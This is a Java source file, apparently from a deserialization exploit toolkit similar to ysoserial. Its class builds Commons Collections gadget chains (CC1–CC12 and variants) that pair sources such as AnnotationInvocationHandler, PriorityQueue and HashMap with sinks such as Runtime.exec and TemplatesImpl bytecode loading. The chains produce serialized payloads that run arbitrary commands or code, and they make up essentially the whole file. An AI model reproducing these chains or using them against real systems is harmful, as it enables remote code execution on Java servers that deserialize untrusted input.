public class GGC {

    // public static Object CCC1() throws Exception {
    //     return Source4.TreeBagSource(Sink4.TemplatesImplNewTransformerSink(DefaultConfig.code));
    // }

    @SinkTypeAnnotation(type = "command")
    public static Object CC1(String command) throws Exception {
        return Source3.AnnotationInvocationHandlerSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC2(String code) throws Exception {
        return Source4.PriorityQueueSource(Sink4.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC3(String code) throws Exception {
        return Source3.AnnotationInvocationHandlerSource(Sink3.TemplatesImplTrAXFilterSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC4(String code) throws Exception {
        return Source4.PriorityQueueSource(Sink4.TemplatesImplTrAXFilterSink(code));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CC5(String command) throws Exception {
        return Source3.BadAttributeValueExpExceptionSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCH5(String command) throws Exception {
        return Source4.BadAttributeValueExpExceptionSource(Sink4.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CC6(String command) throws Exception {
        return Source3.HashMapSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCH6(String command) throws Exception {
        return Source4.HashMapSource(Sink4.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CC7(String command) throws Exception {
        return Source3.HashtableSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCH7(String command) throws Exception {
        return Source4.HashtableSource(Sink4.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC8(String code) throws Exception {
        return Source3.HashSetSource(Sink3.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CCH8(String code) throws Exception {
        return Source4.HashSetSource(Sink4.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CC10(String command) throws Exception {
        return Source3.HashtableSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCH10(String command) throws Exception {
        return Source4.HashtableSource(Sink4.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC11(String code) throws Exception {
        return Source3.HashSetSource(Sink3.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CCH11(String code) throws Exception {
        return Source4.HashSetSource(Sink4.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CC12(String code) throws Exception {
        return Source3.HashMapSource(Sink3.ScriptEngineManagerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CCH12(String code) throws Exception {
        return Source4.HashMapSource(Sink4.ScriptEngineManagerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CCK1(String code) throws Exception {
        return Source3.HashMapSource(Sink3.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "code")
    public static Object CCK2(String code) throws Exception {
        return Source4.HashMapSource(Sink4.TemplatesImplNewTransformerSink(code));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCK3(String command) throws Exception {
        return Source3.HashMapSource(Sink3.RuntimeExecSink(command));
    }

    @SinkTypeAnnotation(type = "command")
    public static Object CCK4(String command) throws Exception {
        return Source4.HashMapSource(Sink4.RuntimeExecSink(command));
    }


    public static Object CC1() throws Exception {
        return CC1(DefaultConfig.command);
    }

    public static Object CC2() throws Exception {
        return CC2(DefaultConfig.code);
    }

    public static Object CC3() throws Exception {
        return CC3(DefaultConfig.code);
    }

    public static Object CC4() throws Exception {
        return CC4(DefaultConfig.code);
    }

    public static Object CC5() throws Exception {
        return CC5(DefaultConfig.command);
    }

    public static Object CC6() throws Exception {
        return CC6(DefaultConfig.command);
    }

    public static Object CC7() throws Exception {
        return CC7(DefaultConfig.command);
    }

    public static Object CCK1() throws Exception {
        return CCK1(DefaultConfig.code);
    }

    public static Object CCK2() throws Exception {
        return CCK2(DefaultConfig.code);
    }

    public static Object CCK3() throws Exception {
        return CCK3(DefaultConfig.command);
    }

    public static Object CCK4() throws Exception {
        return CCK4(DefaultConfig.command);
    }

    public static Object CC8() throws Exception {
        return CC8(DefaultConfig.code);
    }

    public static Object CC10() throws Exception {
        return CC10(DefaultConfig.command);
    }

    public static Object CC11() throws Exception {
        return CC11(DefaultConfig.code);
    }

    public static Object CC12() throws Exception {
        return CC12(DefaultConfig.code);
    }

    public static Object CCH5() throws Exception {
        return CCH5(DefaultConfig.command);
    }

    public static Object CCH6() throws Exception {
        return CCH6(DefaultConfig.command);
    }

    public static Object CCH7() throws Exception {
        return CCH7(DefaultConfig.command);
    }

    public static Object CCH8() throws Exception {
        return CCH8(DefaultConfig.code);
    }

    public static Object CCH10() throws Exception {
        return CCH10(DefaultConfig.command);
    }

    public static Object CCH11() throws Exception {
        return CCH11(DefaultConfig.code);
    }

    public static Object CCH12() throws Exception {
        return CCH12(DefaultConfig.code);
    }
}
